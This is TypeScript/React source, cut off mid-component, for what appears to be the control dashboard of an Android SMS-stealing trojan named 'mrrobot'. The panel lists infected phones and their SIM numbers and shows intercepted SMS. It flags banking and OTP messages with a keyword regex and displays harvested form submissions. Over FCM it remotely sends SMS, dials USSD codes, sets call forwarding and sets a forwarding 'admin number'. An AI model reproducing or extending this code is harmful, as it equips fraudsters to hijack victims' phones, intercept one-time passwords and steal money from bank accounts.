import React, { useState, useEffect, useCallback, useMemo, useRef, createContext, useContext } from "react";
import { useLocation, useParams } from "wouter";
import { createPortal } from "react-dom";
import { CircularLoader } from "@/components/ui/circular-loader";
import { CopyIconButton } from "@/components/ui/copy-icon-button";
import { DeleteIconButton } from "@/components/ui/delete-icon-button";

function apiFetch(url: string, opts: RequestInit = {}): Promise<Response> {
    const h = new Headers(opts.headers);
    // Read appId from sessionStorage — set at login, not from URL anymore
    const _appId = sessionStorage.getItem("mrrobot_active_appid") || "";
    const _jwt = _appId ? sessionStorage.getItem(`mrrobot_jwt_${_appId}`) : null;
    if (_jwt) h.set("Authorization", `Bearer ${_jwt}`);
    return fetch(url, { ...opts, headers: h });
  }

    // PINs must stay plain ASCII -- keeping them free of emoji, Rupee sign, or
    // regional-script characters avoids header-encoding edge cases and keeps
    // them easy to re-type on another device. Enforce this at PIN-set time.
    function isSafePinValue(v: string): boolean {
    return /^[\x20-\x7E]+$/.test(v);
    }
    const PIN_CHAR_ERROR = "PIN me sirf English letters, numbers aur symbols (jaise ! @ # $ %) allowed hain -- emoji, ₹ ya doosri language ke characters allowed nahi hain.";

  function getDeviceId(): string {
    let id = localStorage.getItem("mrrobot_device_id");
    if (!id) { id = crypto.randomUUID(); localStorage.setItem("mrrobot_device_id", id); }
    return id;
  }

const DEVELOPER_TELEGRAM = "@mrrobot_dev";
const DEVELOPER_WHATSAPP = "+91 98765 43210";
const BUILD_VERSION = "v2.0.1 · 2026-05-18";

/* ─── Theme ─── */
interface Theme {
  bg: string; card: string; cardB: string;
  hdr: string; hdrB: string;
  txt: string; txt2: string; muted: string;
  accent: string; activeBg: string;
  isDark: boolean;
}
const LT: Theme = {
  bg: "#f1f5f9", card: "#ffffff", cardB: "#e2e8f0",
  hdr: "#f8fafc", hdrB: "#f1f5f9",
  txt: "#0f172a", txt2: "#334155", muted: "#94a3b8",
  accent: "#6366f1", activeBg: "#eef2ff",
  isDark: false,
};
const DT: Theme = {
  bg: "#0f172a", card: "#1e293b", cardB: "#334155",
  hdr: "#162032", hdrB: "#243444",
  txt: "#f1f5f9", txt2: "#cbd5e1", muted: "#94a3b8",
  accent: "#6366f1", activeBg: "#1e1b4b",
  isDark: true,
};
/* ── Zero Trace theme — completely separate visual identity ── */
const ZT: Theme = {
  bg: "#eef4ff",        // blue-tinted background (vs neutral gray in LT)
  card: "#ffffff",       // white cards pop against blue bg
  cardB: "#93c5fd",     // BLUE card borders — biggest visual diff from LT
  hdr: "#dbeafe",       // light blue section headers (vs near-white in LT)
  hdrB: "#bfdbfe",      // blue section border (vs light gray in LT)
  txt: "#0f172a",       // dark text
  txt2: "#1e3a8a",      // dark navy secondary text (vs slate-gray in LT)
  muted: "#4b6cb7",     // blue-slate muted text (vs gray in LT)
  accent: "#1d4ed8",    // dark blue accent (vs indigo/purple in LT)
  activeBg: "#dbeafe",  // blue active highlight (vs indigo tint in LT)
  isDark: false,
};
const ThemeCtx = createContext<Theme>(LT);
function useTheme() { return useContext(ThemeCtx); }
const DeleteProtCtx = createContext(false);
function useDeleteProt() { return useContext(DeleteProtCtx); }

interface DbDevice {
  id: number; deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number; sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null; status: string;
  lastOnline: string | null; forwardEnabled: boolean; forwardSlot: number | null; fcmToken: string | null; installedAt: string;
  starred: boolean;
}
interface DbMessage {
  id: number; appId: string; deviceId: string; userId: string;
  fromSender: string; fromNumber: string; toNumber?: string | null; body: string; isSensitive: boolean; receivedAt: string;
}
interface DbFormData { id: number; appId: string; deviceId: string; data: Record<string, unknown>; submittedAt: string; }
type Page = "home" | "messages" | "groups" | "devices" | "settings";
type ActionKey = "online_check" | "get_sms" | "send_sms" | "update_number" | "call_forward" | "dial_ussd";
type SendState = "idle" | "loading" | "ok" | "err";

function sc(s: string) {
  if (s === "online") return "#22c55e";
  if (s === "uninstalled") return "#ef4444";
  return "#f59e0b";
}
function sl(s: string) {
  if (s === "online") return "Online";
  if (s === "uninstalled") return "Uninstalled";
  return "Inactive";
}
function fmtDate(iso: string) {
  return new Date(iso).toLocaleString("en-IN", {
    day: "2-digit", month: "short", year: "numeric",
    hour: "2-digit", minute: "2-digit", hour12: false,
  });
}
function fmtShort(iso: string) {
  return new Date(iso).toLocaleString("en-IN", {
    day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: false,
  });
}

/* client-side timeAgo — computed live from raw ISO timestamp */
function timeAgo(iso: string | null): string {
  if (!iso) return "—";
  const dt = new Date(iso);
  if (isNaN(dt.getTime())) return iso; // fallback for legacy strings
  const secs = Math.floor((Date.now() - dt.getTime()) / 1000);
  if (secs < 0) return "just now";
  if (secs < 60) return `${secs}s ago`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}m ago`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.floor(hours / 24)}d ago`;
}

/* returns true if lastOnline ISO is within last 15 minutes */
function isRecent(lastOnline: string | null): boolean {
  if (!lastOnline) return false;
  const dt = new Date(lastOnline);
  if (isNaN(dt.getTime())) return false;
  return Date.now() - dt.getTime() <= 15 * 60 * 1000;
}

// Precisely restore scroll to a specific message card on "back" navigation. Cards use
// content-visibility:auto with a guessed intrinsic height, so surrounding cards can still be
// shifting real layout in for a few frames after the first scrollIntoView — a single call can
// land a little above/below the target. This keeps re-snapping to the card until its position
// stops moving between two consecutive checks, so the user lands EXACTLY on the same card.
function useScrollToMessage(targetMsgId: string | null | undefined, onDone?: () => void) {
  useEffect(() => {
    if (!targetMsgId) return;
    let cancelled = false;
    let attempts = 0;
    let stableChecks = 0;
    let lastTop: number | null = null;
    const tick = () => {
      if (cancelled) return;
      const el = document.getElementById(`msg-${targetMsgId}`);
      if (!el) {
        if (++attempts < 60) setTimeout(tick, 50);
        return;
      }
      el.scrollIntoView({ behavior: "instant" as ScrollBehavior, block: "center" });
      const top = el.getBoundingClientRect().top;
      if (lastTop !== null && Math.abs(top - lastTop) < 1) {
        stableChecks++;
      } else {
        stableChecks = 0;
      }
      lastTop = top;
      // Require a couple of consecutive stable reads before declaring done — layout can
      // keep nudging as more offscreen cards resolve their real intrinsic size.
      if (stableChecks >= 2 || ++attempts >= 60) {
        onDone?.();
        return;
      }
      setTimeout(tick, 60);
    };
    requestAnimationFrame(tick);
    return () => { cancelled = true; };
  }, [targetMsgId]); // eslint-disable-line react-hooks/exhaustive-deps
}

function useInfiniteScroll<T>(items: T[], pageSize = 20, initialCount?: number, onCountChange?: (n: number) => void) {
  const [count, setCount] = useState(initialCount ?? pageSize);
  const sentinelRef = useRef<HTMLDivElement>(null);
  const itemsLen = useRef(items.length);
  const countRef = useRef(count);
  itemsLen.current = items.length;
  countRef.current = count;
  const onCountChangeRef = useRef(onCountChange);
  onCountChangeRef.current = onCountChange;
  const prevLenRef = useRef(items.length);
  const firstMount = useRef(true);
  // Reset to first page ONLY when items shrink (search / filter applied)
  useEffect(() => {
    if (firstMount.current) { firstMount.current = false; prevLenRef.current = items.length; return; }
    if (items.length < prevLenRef.current) { setCount(pageSize); }
    prevLenRef.current = items.length;
  }, [items.length, pageSize]); // eslint-disable-line react-hooks/exhaustive-deps
  // Single long-lived observer — refs keep values current without recreating on every page load.
  // Recreating on count change caused scroll stutter (re-render on every sentinel trigger).
  useEffect(() => {
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (!entries[0].isIntersecting) return;
      if (countRef.current >= itemsLen.current) return;
      requestAnimationFrame(() => {
        setCount(c => {
          if (c >= itemsLen.current) return c;
          const next = Math.min(c + pageSize, itemsLen.current);
          onCountChangeRef.current?.(next);
          return next;
        });
      });
    }, { rootMargin: "200px" });
    obs.observe(el);
    return () => obs.disconnect();
  }, [pageSize]); // eslint-disable-line react-hooks/exhaustive-deps
  useEffect(() => { onCountChangeRef.current?.(count); }, []); // eslint-disable-line react-hooks/exhaustive-deps
  const resetCount = useCallback((n: number) => { setCount(n); onCountChangeRef.current?.(n); }, []);
  return { visible: items.slice(0, count), sentinelRef, hasMore: count < items.length, loading: false, resetCount };
}

async function fcmSend(deviceId: string, data: Record<string, string>): Promise<string> {
  const res = await apiFetch("/api/fcm/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ deviceId, data }),
  });
  const body = await res.json() as Record<string, unknown>;
  if (!res.ok) throw new Error(String((body["error"] as Record<string, unknown>)?.["message"] ?? body["error"] ?? "FCM failed"));
  return String(body["messageId"] ?? "sent");
}

/** type "0" → Android: enqueueCheckOnline */
function mkCheckOnline(): Record<string, string> {
  return { type: "0" };
}
function mkDeviceCmd(_uid: string, action: string, extra?: Record<string, unknown>): Record<string, string> {
  if (action === "get_sms") return { type: "get_sms" };
  if (action === "sms") return {
    type: "send_sms",
    to: String(extra?.to ?? ""),
    message: String(extra?.body ?? ""),
    sim: String(extra?.simSlot ?? 0),
  };
  if (action === "ussd") return {
    type: "dial_ussd",
    code: String(extra?.code ?? ""),
    sim: String(extra?.simSlot ?? 0),
  };
  return { type: action };
}
/** admin_update → Android: setAdminNumber / toggle admin status */
function mkAdminUpdate(_did: string, number: string, status: "on" | "off"): Record<string, string> {
  if (status === "on") return { type: "admin_update", status: "on", number };
  return { type: "admin_update", status: "off" };
}

/* ─── Banking / OTP keyword detector ─── */
// Junk fromSender values from old APK versions where `title` was sent instead
// of the real sender. When detected, fall back to `fromNumber` for display.
function isJunkSender(sender: string | null | undefined): boolean {
  if (!sender) return true;
  const s = sender.trim().toLowerCase();
  if (!s) return true;
  return s === "new sms" || s === "unknown" || s === "sms" || s.startsWith("sms from ");
}

function isBankingMsg(body: string, sender: string): boolean {
  const text = (body + " " + sender).toLowerCase();
  return /\b(otp|upi|neft|rtgs|imps|bank|credit|debit|account|balance|transaction|txn|payment|transfer|rupee|inr|atm|cvv|pin|emi|loan|insurance|fraud|wallet|paytm|gpay|phonepe|bhim|recharge|cashback|refund|invoice|bill|due|mandate|auto.?pay|salary|withdraw|deposit)\b|₹/.test(text);
}

/* ─── Scroll-to-top floating button ─── */
function ScrollToTopBtn() {
  const t = useTheme();
  const btn = (
    <button
      onClick={() => {
        document.getElementById("main-scroll")?.scrollTo({ top: 0, behavior: "smooth" });
      }}
      title="Scroll to top"
      style={{
        position: "fixed",
        bottom: 80,
        right: 18,
        zIndex: 999999,
        width: 46, height: 46, borderRadius: "50%",
        background: t.accent, border: "none", color: "#fff",
        fontSize: 22, fontWeight: 700, cursor: "pointer",
        boxShadow: "0 4px 14px rgba(99,102,241,0.55)",
        display: "flex",
        alignItems: "center", justifyContent: "center",
        WebkitTapHighlightColor: "transparent",
      }}
    >↑</button>
  );
  return createPortal(btn, document.body);
}

/* ─── Row helper ─── */
function Row({ label, value, mono, accent }: { label: string; value: string; mono?: boolean; accent?: string }) {
  const t = useTheme();
  return (
    <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`, gap: 8 }}>
      <div style={{ width: 100, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>{label}</div>
      <div style={{ flex: 1, fontSize: 12, color: accent ?? t.txt, fontFamily: mono ? "monospace" : "inherit", wordBreak: "break-all" }}>{value}</div>
    </div>
  );
}

/* ─── Favorite (starred) device badge — reused wherever a device name is shown so the
   user can tell at a glance, everywhere, that a device has been marked favorite ─── */
function FavoriteBadge({ starred, size = 14 }: { starred?: boolean; size?: number }) {
  if (!starred) return null;
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="#f59e0b" stroke="#f59e0b" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
      <title>Favorite device</title>
      <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
    </svg>
  );
}

/* ─── Message card ─── */
const MsgCard = React.memo(function MsgCard({
  msg, deviceName, device, onOpen, cardClickable, formEntries,
}: {
  msg: DbMessage;
  deviceName: string;
  device?: DbDevice;
  onOpen?: (d: DbDevice, msgId: string) => void;
  cardClickable?: boolean;
  formEntries?: DbFormData[];
}) {
  const t = useTheme();
  const dpEnabled = useDeleteProt();
  const [showForm, setShowForm] = useState(false);
  const [deletedToast, setDeletedToast] = useState(false);

  function handleCardClick() {
    if (!cardClickable) return;
    if (device) {
      onOpen?.(device, String(msg.id));
    } else {
      setDeletedToast(true);
      setTimeout(() => setDeletedToast(false), 3000);
    }
  }

  return (
    <div id={`msg-${msg.id}`} style={{ position: "relative", borderRadius: 8, overflow: "hidden", border: `1px solid ${t.cardB}`,
      // GPU skips offscreen card paint/layout → buttery scroll with thousands of cards.
      // `auto 140px` = remember each card's last-rendered height so pixel-scroll restore stays accurate.
      contentVisibility: "auto",
      containIntrinsicSize: "auto 140px",
    } as React.CSSProperties}>
      {deletedToast && (
        <div style={{ position: "absolute", top: 8, left: "50%", transform: "translateX(-50%)", zIndex: 10, background: "#1e293b", color: "#f87171", fontSize: 11, fontWeight: 600, padding: "5px 14px", borderRadius: 20, border: "1px solid #f87171", whiteSpace: "nowrap", pointerEvents: "none" }}>
          ⚠️ This device has been deleted
        </div>
      )}
      <div
        onClick={cardClickable ? handleCardClick : undefined}
        style={{
          background: t.card, padding: "10px 14px",
          cursor: cardClickable ? "pointer" : "default",
          transition: "box-shadow 0.15s",
        }}
        onMouseEnter={e => { if (cardClickable) (e.currentTarget as HTMLDivElement).style.boxShadow = "0 2px 8px rgba(99,102,241,0.13)"; }}
        onMouseLeave={e => { (e.currentTarget as HTMLDivElement).style.boxShadow = "none"; }}
      >
        {/* Header row */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, gap: 8 }}>
          <span style={{ fontSize: 10, color: "#94a3b8" }}>{fmtShort(msg.receivedAt)}</span>
          <span style={{ fontSize: 10, background: t.hdrB, color: t.muted, padding: "1px 7px", borderRadius: 4, display: "inline-flex", alignItems: "center", gap: 4 }}>
            <FavoriteBadge starred={device?.starred} size={11} />{deviceName}
          </span>
        </div>

        {/* Body */}
        <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 6 }}>
          <div style={{ flex: 1, fontSize: 13, color: isBankingMsg(msg.body, msg.fromSender) ? "#16a34a" : t.txt, lineHeight: 1.55, wordBreak: "break-word" }}>{msg.body}</div>
          <CopyIconButton value={msg.body} size={22} color={t.accent} title="Copy message" />
        </div>

        {/* From / To + Delete */}
        <div style={{ display: "flex", gap: 12, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
          {(() => {
            const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
            return (
              <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
                <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>{displaySender}
                <CopyIconButton value={displaySender} size={18} color={t.accent} title="Copy sender" />
              </span>
            );
          })()}
          {msg.toNumber && (
            <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
              <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>TO</span>{msg.toNumber}
              <CopyIconButton value={msg.toNumber} size={18} color={t.accent} title="Copy receiver" />
            </span>
          )}
          <span style={{ flex: 1 }} />
          <DeleteIconButton
            hidden={dpEnabled}
            size={30}
            title="Delete this SMS"
            confirmTitle="Delete SMS"
            confirmText={`Are you sure you want to delete this SMS from ${msg.fromSender}? This action cannot be undone.`}
            onConfirm={async () => {
              const r = await apiFetch(`/api/messages/${msg.id}`, { method: "DELETE" });
              if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
            }}
          />
        </div>
      </div>

      {/* Form Data button — only when formEntries provided */}
      {formEntries !== undefined && (
        <button
          onClick={() => setShowForm(v => !v)}
          style={{
            width: "100%", padding: "7px 0", border: "none", borderTop: `1px solid ${t.cardB}`,
            background: showForm ? t.hdrB : t.bg,
            color: "#8b5cf6",
            fontWeight: 700, fontSize: 11, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 5,
          }}
        >
          <span style={{ fontSize: 12 }}>◈</span>
          Form Data {formEntries.length > 0 ? `(${formEntries.length})` : "(0)"}
          <span style={{ fontSize: 10, display: "inline-block", transform: showForm ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}>▾</span>
        </button>
      )}

      {/* Inline form data */}
      {formEntries !== undefined && showForm && (
        <div style={{ background: t.hdrB, borderTop: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          {formEntries.length === 0
            ? <div style={{ fontSize: 11, color: t.muted, textAlign: "center", padding: "8px 0" }}>No form data from this device</div>
            : formEntries.slice().sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()).map((entry, idx, arr) => {
                const pairs = Object.entries(entry.data ?? {});
                const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
                return (
                  <div key={entry.id} style={{ borderBottom: idx < arr.length - 1 ? `1px solid ${t.cardB}` : "none" }}>
                    {/* Entry number + time — header row */}
                    <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "2px 10px", background: t.hdrB }}>
                      <span style={{ fontSize: 8, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
                      <span style={{ fontSize: 8, color: t.muted }}>{time}</span>
                    </div>
                    {/* Key-value rows */}
                    {pairs.length === 0
                      ? <div style={{ fontSize: 10, color: t.muted, padding: "2px 10px 4px" }}>—</div>
                      : pairs.map(([k, v]) => {
                        const sv = String(v ?? "");
                        return (
                          <div key={k} style={{ display: "flex", gap: 8, padding: "3px 10px", alignItems: "center", background: t.card }}>
                            <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, minWidth: 86, flexShrink: 0 }}>{fmtKey(k)}</span>
                            <span style={{ fontSize: 10, color: t.txt, wordBreak: "break-all", flex: 1 }}>{sv}</span>
                            {sv && <CopyIconButton value={sv} size={18} color="#8b5cf6" title={`Copy ${fmtKey(k)}`} />}
                          </div>
                        );
                      })
                    }
                    {/* Delete button — bottom */}
                    <div style={{ display: "flex", justifyContent: "flex-end", padding: "4px 10px", background: t.hdrB }}>
                      <DeleteIconButton
                        hidden={dpEnabled}
                        size={26}
                        title="Delete this entry"
                        confirmTitle="Delete Form Entry"
                        confirmText="Are you sure you want to delete this form entry? This action cannot be undone."
                        onConfirm={async () => {
                          const r = await apiFetch(`/api/data/${entry.id}`, { method: "DELETE" });
                          if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                        }}
                      />
                    </div>
                  </div>
                );
              })
          }
        </div>
      )}
    </div>
  );
});

/* ─── SIM Selector ─── */
function SimSelect({ value, onChange, device }: { value: "1" | "2"; onChange: (v: "1" | "2") => void; device: DbDevice }) {
  const t = useTheme();
  const labels = {
    "1": [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(" · ") || "—",
    "2": [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(" · ") || "—",
  };
  return (
    <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
      {(["1", "2"] as const).map(s => {
        const active = value === s;
        return (
          <button key={s} onClick={() => onChange(s)} style={{
            flex: 1, padding: "8px 10px", borderRadius: 8, border: "1.5px solid",
            borderColor: active ? t.accent : t.cardB,
            background: active ? (t.activeBg) : t.hdrB, cursor: "pointer", textAlign: "left",
          }}>
            <div style={{ fontSize: 11, fontWeight: 700, color: active ? t.accent : t.txt2 }}>SIM {s}</div>
            <div style={{ fontSize: 10, color: active ? "#818cf8" : t.muted, marginTop: 2, wordBreak: "break-all" }}>{labels[s]}</div>
          </button>
        );
      })}
    </div>
  );
}

function FieldInput({ placeholder, value, onChange, type = "text" }: { placeholder: string; value: string; onChange: (v: string) => void; type?: string }) {
  const t = useTheme();
  return (
    <input type={type} value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} style={{
      width: "100%", boxSizing: "border-box", border: `1.5px solid ${t.cardB}`, borderRadius: 8,
      padding: "10px 12px", fontSize: 13, outline: "none", marginBottom: 10,
      color: t.txt, background: t.card, fontFamily: "inherit",
    }} />
  );
}

function StatusLog({ state, log }: { state: SendState; log: string }) {
  if (!log) return null;
  return (
    <div style={{
      fontSize: 12, padding: "8px 12px", borderRadius: 8, marginBottom: 8,
      background: state === "ok" ? "#f0fdf4" : state === "err" ? "#fef2f2" : "#fefce8",
      color: state === "ok" ? "#16a34a" : state === "err" ? "#dc2626" : "#92400e",
    }}>{log}</div>
  );
}

/* ── 5-second horizontal progress bar ── */
function SendProgressBar({ active }: { active: boolean }) {
  const [pct, setPct] = useState(0);
  const t = useTheme();
  useEffect(() => {
    if (!active) { setPct(0); return; }
    setPct(0);
    const start = Date.now();
    const DURATION = 5000;
    const tick = () => {
      const elapsed = Date.now() - start;
      const next = Math.min(100, Math.round((elapsed / DURATION) * 100));
      setPct(next);
      if (next < 100) requestAnimationFrame(tick);
    };
    const raf = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(raf);
  }, [active]);

  if (!active && pct === 0) return null;
  return (
    <div style={{ marginTop: 8, height: 5, borderRadius: 99, background: t.hdrB, overflow: "hidden" }}>
      <div style={{
        height: "100%", borderRadius: 99,
        background: "linear-gradient(90deg,#6366f1,#818cf8)",
        width: `${pct}%`,
        transition: "width 0.1s linear",
      }} />
    </div>
  );
}

function PrimaryBtn({ state, idle, loading: ld, ok, onClick }: {
  state: SendState; idle: string; loading: string; ok: string; onClick: () => void;
}) {
  const t = useTheme();
  return (
    <>
      <button onClick={onClick} disabled={state === "loading"} style={{
        width: "100%", padding: "12px 0", borderRadius: 10, border: "none",
        background: state === "ok" ? "#22c55e" : t.accent,
        color: "#fff", fontWeight: 700, fontSize: 14,
        cursor: state === "loading" ? "wait" : "pointer", marginTop: 2,
      }}>
        {state === "loading" ? ld : state === "ok" ? ok : idle}
      </button>
      <SendProgressBar active={state === "loading"} />
    </>
  );
}

/* ════ INLINE ACTION PANEL ════ */
function ActionPanel({ action, device, onClose }: { action: ActionKey; device: DbDevice; onClose: () => void }) {
  const [sim, setSim] = useState<"1" | "2">("1");
  const [number, setNumber] = useState("");
  const [smsText, setSmsText] = useState("");
  const [ussdCode, setUssdCode] = useState("");
  const [state, setState] = useState<SendState>("idle");
  const [log, setLog] = useState("");
  const [countdown, setCountdown] = useState(0);
  const [fcmBar, setFcmBar] = useState(false); // 5-second progress bar after FCM send
  const [updateDisableState, setUpdateDisableState] = useState<SendState>("idle");

  // Live countdown for online_check: 0 → 30
  useEffect(() => {
    if (state !== "loading" || action !== "online_check") return;
    setCountdown(0);
    const iv = setInterval(() => setCountdown(c => c + 1), 1000);
    return () => clearInterval(iv);
  }, [state, action]);

  // Auto-timeout online_check after 30s — silently reset to idle
  useEffect(() => {
    if (state !== "loading" || action !== "online_check") return;
    const t = setTimeout(() => setState("idle"), 30000);
    return () => clearTimeout(t);
  }, [state, action]);

  // SSE: device responded → stop online_check countdown & show success
  useEffect(() => {
    if (action !== "online_check") return;
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (deviceId !== device.deviceId) return;
      setState("ok");
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, [action, device.deviceId]);

  async function send(data: Record<string, string>) {
    setState("loading"); setLog("");
    setFcmBar(true); // Start 5-second FCM progress bar immediately
    const barTimer = setTimeout(() => setFcmBar(false), 5000);
    try {
      await fcmSend(device.deviceId, data);
      // online_check stays "loading" until SSE fires (device heartbeat) or 30s timeout
      if (action !== "online_check") {
        setState("ok"); setLog("");
        if (localStorage.getItem("mr_clean_after_process") === "1") {
          setTimeout(() => { setNumber(""); setSmsText(""); setUssdCode(""); }, 800);
        }
      }
    } catch {
      setState("idle");
      clearTimeout(barTimer); setFcmBar(false);
    }
  }

  const titles: Record<ActionKey, string> = {
    online_check: "Online Check", get_sms: "Get SMS", send_sms: "Send SMS",
    update_number: "Update Number", call_forward: "Call Forwarding", dial_ussd: "Dial USSD",
  };

  const t = useTheme();

  return (
    <div style={{ background: t.card, borderRadius: 10, border: `1.5px solid ${t.cardB}`, padding: "14px", boxShadow: "0 2px 8px rgba(0,0,0,0.08)" }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 14 }}>
        <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>{titles[action]}</div>
        <button onClick={onClose} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: 18, cursor: "pointer", padding: 0, lineHeight: 1 }}>✕</button>
      </div>

      {action === "online_check" && (
        <>
          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>
            Pings <b>{device.name}</b> to check if it's online and reachable.
          </div>
          <StatusLog state={state} log={log} />
          <button onClick={() => void send(mkCheckOnline())} disabled={state === "loading"} style={{
            width: "100%", padding: "12px 0", borderRadius: 10, border: "none",
            background: state === "ok" ? "#22c55e" : t.accent,
            color: "#fff", fontWeight: 700, fontSize: 14,
            cursor: state === "loading" ? "wait" : "pointer", marginTop: 2,
          }}>
            {state === "loading" ? `Waiting… ${countdown}s` : state === "ok" ? "✓ Online" : "Ping Device"}
          </button>
          {state === "loading" && (
            <div style={{ textAlign: "center", fontSize: 11, color: t.muted, marginTop: 8 }}>
              Waiting for device response… ({30 - countdown}s remaining)
            </div>
          )}
        </>
      )}
      {action === "get_sms" && (
        <>
          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>Device will upload its latest messages.</div>
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Get SMS" loading="Requesting…" ok="Sent" onClick={() => void send(mkDeviceCmd(device.deviceId, "get_sms"))} />
        </>
      )}
      {action === "send_sms" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="Recipient number" value={number} onChange={setNumber} type="tel" />
          <textarea value={smsText} onChange={e => setSmsText(e.target.value)} placeholder="Message text…" rows={3} style={{
            width: "100%", boxSizing: "border-box", border: `1.5px solid ${t.cardB}`, borderRadius: 8,
            padding: "10px 12px", fontSize: 13, outline: "none", marginBottom: 10,
            color: t.txt, background: t.card, resize: "vertical", fontFamily: "inherit",
          }} />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Send SMS" loading="Sending…" ok="SMS Sent" onClick={() => {
            if (!number.trim()) { setLog("Enter a recipient number."); setState("err"); return; }
            if (!smsText.trim()) { setLog("Enter message text."); setState("err"); return; }
            void send(mkDeviceCmd(device.deviceId, "sms", { to: number.trim(), body: smsText.trim(), simSlot: sim === "2" ? 1 : 0, timestamp: Date.now() }));
          }} />
        </>
      )}
      {action === "update_number" && (
        <>
          <div style={{ fontSize: 12, color: t.txt2, marginBottom: 12 }}>
            Update admin number for <b>{device.name}</b>.
          </div>
          <FieldInput placeholder="10-digit number" value={number} onChange={v => setNumber(v.replace(/\D/g, "").slice(0, 10))} type="tel" />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Update Number" loading="Updating…" ok="Updated ✓" onClick={() => {
            const digits = number.replace(/\D/g, "");
            if (digits.length !== 10) { setLog("Enter exactly 10 digits."); setState("err"); return; }
            void send(mkAdminUpdate(device.deviceId, digits, "on"));
          }} />
          <div style={{ marginTop: 10 }}>
            <button
              onClick={() => {
                setUpdateDisableState("loading");
                fcmSend(device.deviceId, mkAdminUpdate(device.deviceId, "", "off"))
                  .then(() => { setUpdateDisableState("ok"); setTimeout(() => setUpdateDisableState("idle"), 3000); })
                  .catch(() => { setUpdateDisableState("idle"); });
              }}
              disabled={updateDisableState === "loading"}
              style={{
                width: "100%", padding: "11px 0", borderRadius: 9, border: "1.5px solid #ef4444",
                background: updateDisableState === "ok" ? "#22c55e" : updateDisableState === "loading" ? "#fee2e2" : "transparent",
                color: updateDisableState === "ok" ? "#fff" : "#ef4444",
                fontWeight: 700, fontSize: 13,
                cursor: updateDisableState === "loading" ? "wait" : "pointer",
                transition: "background 0.15s",
              }}
            >
              {updateDisableState === "loading" ? "Disabling…" : updateDisableState === "ok" ? "Disabled ✓" : "Disable Forwarding"}
            </button>
          </div>
        </>
      )}
      {action === "call_forward" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="Forward to number" value={number} onChange={setNumber} type="tel" />
          <StatusLog state={state} log={log} />
          <div style={{ display: "flex", gap: 10 }}>
            <button onClick={() => {
              if (!number.trim()) { setLog("Enter a number to forward calls to."); setState("err"); return; }
              void send({ type: "call_forward", action: "activate", number: number.trim(), sim: String(sim === "2" ? 1 : 0) });
            }} disabled={state === "loading"} style={{ flex: 1, padding: "12px 0", borderRadius: 10, border: "none", background: state === "ok" ? "#22c55e" : "#22c55e", color: "#fff", fontWeight: 700, fontSize: 14, cursor: state === "loading" ? "wait" : "pointer" }}>
              {state === "loading" ? "Activating…" : "Activate"}
            </button>
            <button onClick={() => {
              void send({ type: "call_forward", action: "deactivate", number: "", sim: String(sim === "2" ? 1 : 0) });
            }} disabled={state === "loading"} style={{ flex: 1, padding: "12px 0", borderRadius: 10, border: "none", background: "#ef4444", color: "#fff", fontWeight: 700, fontSize: 14, cursor: state === "loading" ? "wait" : "pointer" }}>
